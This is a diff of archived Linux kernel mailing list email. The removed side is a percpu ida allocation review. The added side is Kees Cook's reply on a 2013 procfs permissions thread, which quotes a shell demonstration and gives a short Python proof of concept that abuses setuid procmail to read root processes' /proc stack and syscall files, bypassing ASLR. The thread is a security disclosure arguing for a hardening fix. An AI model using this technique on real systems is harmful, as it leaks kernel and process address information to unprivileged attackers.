@@ -1,91 +1,226 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1755408Ab3H1Uoo (ORCPT <rfc822;w@1wt.eu>);
-	Wed, 28 Aug 2013 16:44:44 -0400
-Received: from mail-pb0-f52.google.com ([209.85.160.52]:45198 "EHLO
-	mail-pb0-f52.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1751961Ab3H1Uom (ORCPT
+	id S1755168Ab3H1UtJ (ORCPT <rfc822;w@1wt.eu>);
+	Wed, 28 Aug 2013 16:49:09 -0400
+Received: from mail-ie0-f178.google.com ([209.85.223.178]:46935 "EHLO
+	mail-ie0-f178.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1753290Ab3H1UtH (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Wed, 28 Aug 2013 16:44:42 -0400
-Date: Wed, 28 Aug 2013 13:44:54 -0700
-From: Kent Overstreet <kmo@daterainc.com>
-To: Andrew Morton <akpm@linux-foundation.org>
-Cc: "Nicholas A. Bellinger" <nab@linux-iscsi.org>,
-        target-devel <target-devel@vger.kernel.org>,
-        lf-virt <virtualization@lists.linux-foundation.org>,
-        lkml <linux-kernel@vger.kernel.org>, kvm-devel <kvm@vger.kernel.org>,
-        "Michael S. Tsirkin" <mst@redhat.com>, Asias He <asias@redhat.com>,
-        Jens Axboe <axboe@kernel.dk>, Tejun Heo <tj@kernel.org>,
-        Ingo Molnar <mingo@redhat.com>, Andi Kleen <andi@firstfloor.org>,
-        Christoph Lameter <cl@gentwo.org>, Oleg Nesterov <oleg@redhat.com>,
-        Christoph Lameter <cl@linux-foundation.org>
-Subject: Re: [PATCH-v3 1/4] idr: Percpu ida
-Message-ID: <20130828204454.GC1357@kmo-pixel>
-References: <1376694549-20609-1-git-send-email-nab@linux-iscsi.org>
- <1376694549-20609-2-git-send-email-nab@linux-iscsi.org>
- <20130820143157.f91bf59d16352989b54e431e@linux-foundation.org>
- <20130828195317.GE8032@kmo-pixel>
- <20130828132332.6d5263ee9622235ae0fcc615@linux-foundation.org>
+	Wed, 28 Aug 2013 16:49:07 -0400
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20130828132332.6d5263ee9622235ae0fcc615@linux-foundation.org>
-User-Agent: Mutt/1.5.21 (2010-09-15)
+In-Reply-To: <20130828201141.GA21455@dztty>
+References: <1377534240-13227-1-git-send-email-tixxdz@opendz.org>
+	<871u5gqtw3.fsf@xmission.com>
+	<20130826172054.GE27005@ZenIV.linux.org.uk>
+	<20130827172406.GA2664@dztty>
+	<20130828201141.GA21455@dztty>
+Date: Wed, 28 Aug 2013 13:49:06 -0700
+X-Google-Sender-Auth: XUDc6_lawkenErBhKxc_LR-n0RI
+Message-ID: <CAGXu5jJ2yop1JrJT1nzKWoT_Q83s9fGK_2BuBcCotHCR9YecDQ@mail.gmail.com>
+Subject: Re: [PATCH 1/2] procfs: restore 0400 permissions on /proc/*/{syscall,stack,personality}
+From: Kees Cook <keescook@chromium.org>
+To: Djalal Harouni <tixxdz@opendz.org>
+Cc: Al Viro <viro@zeniv.linux.org.uk>,
+        "Eric W. Biederman" <ebiederm@xmission.com>,
+        Andrew Morton <akpm@linux-foundation.org>,
+        Solar Designer <solar@openwall.com>,
+        Vasiliy Kulikov <segoon@openwall.com>,
+        Linus Torvalds <torvalds@linux-foundation.org>,
+        Ingo Molnar <mingo@kernel.org>, LKML <linux-kernel@vger.kernel.org>,
+        "kernel-hardening@lists.openwall.com" 
+	<kernel-hardening@lists.openwall.com>
+Content-Type: text/plain; charset=ISO-8859-1
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Wed, Aug 28, 2013 at 01:23:32PM -0700, Andrew Morton wrote:
-> On Wed, 28 Aug 2013 12:53:17 -0700 Kent Overstreet <kmo@daterainc.com> wrote:
-> 
-> > > > +	while (1) {
-> > > > +		spin_lock(&pool->lock);
-> > > > +
-> > > > +		/*
-> > > > +		 * prepare_to_wait() must come before steal_tags(), in case
-> > > > +		 * percpu_ida_free() on another cpu flips a bit in
-> > > > +		 * cpus_have_tags
-> > > > +		 *
-> > > > +		 * global lock held and irqs disabled, don't need percpu lock
-> > > > +		 */
-> > > > +		prepare_to_wait(&pool->wait, &wait, TASK_UNINTERRUPTIBLE);
-> > > > +
-> > > > +		if (!tags->nr_free)
-> > > > +			alloc_global_tags(pool, tags);
-> > > > +		if (!tags->nr_free)
-> > > > +			steal_tags(pool, tags);
-> > > > +
-> > > > +		if (tags->nr_free) {
-> > > > +			tag = tags->freelist[--tags->nr_free];
-> > > > +			if (tags->nr_free)
-> > > > +				set_bit(smp_processor_id(),
-> > > > +					pool->cpus_have_tags);
-> > > > +		}
-> > > > +
-> > > > +		spin_unlock(&pool->lock);
-> > > > +		local_irq_restore(flags);
-> > > > +
-> > > > +		if (tag >= 0 || !(gfp & __GFP_WAIT))
-> > > > +			break;
-> > > > +
-> > > > +		schedule();
-> > > > +
-> > > > +		local_irq_save(flags);
-> > > > +		tags = this_cpu_ptr(pool->tag_cpu);
-> > > > +	}
-> > > 
-> > > What guarantees that this wait will terminate?
-> > 
-> > It seems fairly clear to me from the break statement a couple lines up;
-> > if we were passed __GFP_WAIT we terminate iff we succesfully allocated a
-> > tag. If we weren't passed __GFP_WAIT we never actually sleep.
-> 
-> OK ;)  Let me rephrase.  What guarantees that a tag will become available?
-> 
-> If what we have here is an open-coded __GFP_NOFAIL then that is
-> potentially problematic.
+On Wed, Aug 28, 2013 at 1:11 PM, Djalal Harouni <tixxdz@opendz.org> wrote:
+> Cc'ed more people,
+>
+> On Tue, Aug 27, 2013 at 06:24:06PM +0100, Djalal Harouni wrote:
+>> Hi Al,
+>>
+>> On Mon, Aug 26, 2013 at 06:20:55PM +0100, Al Viro wrote:
+>> > On Mon, Aug 26, 2013 at 09:49:48AM -0700, Eric W. Biederman wrote:
+>> >
+>> > > How does changing the permissions to S_IRUSR prevent someone from
+>> > > opening the file before, and reading the file after a suid exec?
+>> > >
+>> > > > This patch restores the old mode which was 0400
+>> > >
+>> > > Which seems to add no security whatsoever and obscure the fact that
+>> > > anyone who cares can read the file so what is the point?
+>> >
+>> > Two words: "security sclerosis".  Both patches NAKed, of course.
+>> These particular tissues "are being hardened", no cure for them
+>>
+>>
+>> More seriously, Al your commit a9712bc12c40c172e393f85 closes the races
+>> during read() ok, but can you please share some light why the permission
+>> mode was changed ?
+>>
+>> 1)
+>> The commit log states that all these files are "rw-r--r--" which was not
+>> correct, they were "r--------" before that commit.
+>>
+>> 2)
+>> The commit log says also:
+>> "if you open a file before the target does suid-root exec, you'll be still
+>> able to access it." so you do the task is tracable check at read()
+>>
+>> But what if you open a file of a privileged target or a target that does
+>> suid-root exec later, and pass the fd to a suid-root exec to read() from
+>> it later, you will still pass that tracable check.
+>>
+>> And currently a non-privileged process can get an fd on all these
+>> /proc/*/stack files even root owned ones.
+>>
+>> So why not restore the old behaviour and block a process from getting an
+>> fd on /proc/*/stack files that belong to other processes?
+>>
+>>
+>> The original thread that added the /proc/*/stack feature:
+>> https://lkml.org/lkml/2008/11/7/109
+>>
+>> They noted that it should be under 0400 permissions
 
-It's the same semantics as a mempool, really - it'll succeed when a tag
-gets freed.  If we are sleeping then there isn't really anything else we
-can do, there isn't anything we're trying in the __GFP_WAIT case that
-we're not trying in the GFP_NOWAIT case.
+Yes, this was discussed years ago -- these files must be 0400 _and_
+perform at-read checks.
+
+https://lkml.org/lkml/2011/2/10/21
+
+This is all related to
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1020
+
+Which had the following fixes, but broken file access perms in several places:
+
+http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=a9712bc12c40c172e393f85a9b2ba8db4bf59509
+http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=2fadaef41283aad7100fa73f01998cddaca25833
+http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d6f64b89d7ff22ce05896ab4a93a653e8d0b123d
+http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ec6fd8a4355cda81cd9f06bebc048e83eb514ac7
+http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ca6b0bf0e086513b9ee5efc0aa5770ecb57778af
+
+So instead of needing to survive exec, now the file can just be passed as stdin.
+
+>>
+>> So why remove that, or why not restore the old safe behaviour ?
+>>
+>>
+>> Hope to get a response
+>>
+>> Thanks Al
+>
+> Hope this will convince.
+>
+> Please not I'm just trying to help/contribute and get things right.
+> If there is something obvious that I'm missing let me know, will
+> be happy to learn
+>
+>
+> tixxdz@dztty-qemu:~$ id
+> uid=1000(tixxdz) gid=1000(tixxdz)
+> groups=1000(tixxdz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+>
+> tixxdz@dztty-qemu:~$ ls -lha ./a.out
+> -rwxr-xr-x 1 tixxdz tixxdz 8.0K Aug 28 20:26 ./a.out
+>
+> tixxdz@dztty-qemu:~$ ls -lha /usr/bin/procmail
+> -rwsr-sr-x 1 root mail 88K Apr 25  2010 /usr/bin/procmail
+>
+> (procmail with -d needs setuid())
+>
+> tixxdz@dztty-qemu:~$ for i in $(seq 1 10); do ./a.out /usr/bin/procmail
+> /proc/$i/stack ; done
+
+Can you include your C file for your a.out? I assume you're opening
+/proc/$i/stack and duping to stdin for a "procmail -d tixxdz" call,
+and I can reproduce this with the following python, but I want to be
+sure I'm seeing the same bug.
+
+#!/usr/bin/python
+import sys
+from subprocess import call
+call(["/usr/bin/procmail", "-d", sys.argv[2]], stdin=open(sys.argv[1]))
+
+
+$ ps -ef | grep apache2 | grep root
+root      3781     1  0 Jul28 ?        00:00:37 /usr/sbin/apache2 -k start
+$ cat /proc/3781/stack
+cat: /proc/3781/stack: Operation not permitted
+$ /tmp/dup-stdin.py /proc/3781/syscall kees
+$ cat /var/mail/kees
+23 0x0 0x0 0x0 0x0 0x7fffa29c9cf0 0x1 0x7fffa29c9d18 0x7f1b76bbd233
+
+So, local ASLR bypass using a setuid helper.
+
+One shouldn't be able to open these files in the first place.
+
+-Kees
+
+>
+> tixxdz@dztty-qemu:~$ cat /var/mail/tixxdz
+> [<ffffffff811b6537>] poll_schedule_timeout+0x57/0xe0
+> [<ffffffff811b70c7>] do_select+0x8b7/0x9a0
+> [<ffffffff811b766c>] core_sys_select+0x4bc/0x4f0
+> [<ffffffff811b7761>] SyS_select+0xc1/0x110
+> [<ffffffff81aef5e9>] system_call_fastpath+0x16/0x1b
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff8108a6e1>] kthreadd+0xb1/0x150
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff8109389e>] smpboot_thread_fn+0x1be/0x220
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff81081610>] worker_thread+0x2e0/0x370
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff81081610>] worker_thread+0x2e0/0x370
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff81081610>] worker_thread+0x2e0/0x370
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff8109389e>] smpboot_thread_fn+0x1be/0x220
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff811020f3>] rcu_gp_kthread+0xe3/0x620
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff811023b4>] rcu_gp_kthread+0x3a4/0x620
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> [<ffffffff8109389e>] smpboot_thread_fn+0x1be/0x220
+> [<ffffffff8108a1b1>] kthread+0xd1/0xe0
+> [<ffffffff81aef53c>] ret_from_fork+0x7c/0xb0
+> [<ffffffffffffffff>] 0xffffffffffffffff
+>
+> You have mail in /var/mail/tixxdz
+>
+>
+> Thanks
+>
+> --
+> Djalal Harouni
+> http://opendz.org
+
+
+
+-- 
+Kees Cook
+Chrome OS Security
